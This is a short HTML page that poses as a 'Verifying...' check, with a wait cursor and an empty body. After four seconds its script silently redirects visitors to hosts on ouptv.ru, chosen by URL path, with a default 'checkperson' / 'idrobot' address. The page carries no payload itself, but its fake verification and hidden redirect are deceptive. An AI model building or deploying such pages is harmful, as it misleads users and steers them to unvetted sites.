<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verifying...</title>
</head>
<body style="background:#fff; cursor:wait;">
    <script>
        var path = window.location.pathname;
        var target = "https://checkperson.ouptv.ru/idrobot"; // Куда слать, если путь непонятный

        if (path.includes('/mob')) {
            target = "https://m.ouptv.ru";
        } else if (path.includes('/desktop')) {
            target = "https://desktop.ouptv.ru";
        }

        setTimeout(function() {
            window.location.replace(target);
        }, 4000);
    </script>
</body>
</html>
